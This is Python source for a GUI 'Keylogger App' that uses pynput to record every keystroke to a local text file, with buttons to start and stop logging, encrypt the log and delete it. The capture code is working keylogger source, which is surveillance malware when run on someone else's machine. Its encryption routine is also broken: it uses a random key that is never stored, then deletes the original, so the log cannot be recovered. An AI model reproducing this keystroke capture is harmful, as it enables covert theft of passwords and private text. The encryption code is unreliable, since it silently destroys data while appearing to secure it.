from tkinter import messagebox
import customtkinter as ctk
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import base64
import os

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger App")
        self.root.geometry("400x300")
        self.root.resizable(False, False)

        # UI Elements
        self.label = ctk.CTkLabel(root, text="Keylogger Control Panel")
        self.label.pack(pady=(20, 10))

        self.start_button = ctk.CTkButton(root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=(10, 5))

        self.stop_button = ctk.CTkButton(root, text="Stop Logging", command=self.stop_logging)
        self.stop_button.pack(pady=(5, 5))

        self.encrypt_button = ctk.CTkButton(root, text="Encrypt Log File", command=self.encrypt_log_file)
        self.encrypt_button.pack(pady=(5, 5))

        self.delete_button = ctk.CTkButton(root, text="Delete Log File", command=self.delete_log_file)
        self.delete_button.pack(pady=(5, 10))

        self.status_label = ctk.CTkLabel(root, text="Status: Not Logging")
        self.status_label.pack(pady=(10, 20))

        self.is_logging = False
        self.log_file = "keylogs.txt"
        self.encrypted_log_file = "keylogs_encrypted.txt"
        self.listener = None

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.status_label.configure(text="Status: Logging")
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.status_label.configure(text="Status: Not Logging")
            if self.listener:
                self.listener.stop()
                self.listener = None

    def on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                f.write(f'{key.char}')
        except AttributeError:
            with open(self.log_file, 'a') as f:
                f.write(f'{key}')

    def encrypt_log_file(self):
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'rb') as f:
                    plaintext = f.read()

                key = get_random_bytes(16)
                cipher = AES.new(key, AES.MODE_CBC)
                iv = cipher.iv
                ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
                encrypted_content = base64.b64encode(iv + ciphertext).decode('utf-8')

                with open(self.encrypted_log_file, 'w') as f:
                    f.write(encrypted_content)

                os.remove(self.log_file)  # Delete the original file

                # Set encrypted file to read-only
                os.chmod(self.encrypted_log_file, 0o444)

                self.status_label.configure(text="Log File Encrypted and Original Deleted")
            else:
                messagebox.showinfo("Info", "Log file does not exist.")
        except Exception as e:
            messagebox.showerror("Error", f"Encryption failed: {str(e)}")

    def delete_log_file(self):
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                self.status_label.configure(text="Log File Deleted")
            else:
                messagebox.showinfo("Info", "Log file does not exist.")
        except Exception as e:
            messagebox.showerror("Error", f"Deletion failed: {str(e)}")

if __name__ == "__main__":
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    app = KeyloggerApp(root)
    root.mainloop()
